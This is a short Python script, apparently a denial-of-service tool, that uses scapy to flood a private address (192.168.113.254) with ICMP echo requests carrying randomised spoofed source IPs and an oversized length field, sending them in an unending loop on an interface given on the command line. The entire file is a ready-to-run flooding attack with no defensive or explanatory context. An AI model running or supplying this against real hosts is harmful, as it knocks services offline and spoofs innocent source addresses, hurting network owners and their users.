#!usr/bin/python
#-*- coding:utf-8 -*-
import sys
from scapy.all import *


def icmp_floodatt(interface):
    attackpacket = IP(src=RandIP('*.*.*.*'), dst='192.168.113.254',len=65530)/ICMP(type='echo-request')
    while 1:
        send(attackpacket, iface=interface, loop=100)


def main():
    if len(sys.argv) < 2:
        print ('Usage: python icmp_flood.py iface')
    else:
        icmp_floodatt(sys.argv[1])
if __name__ == '__main__':
    main()
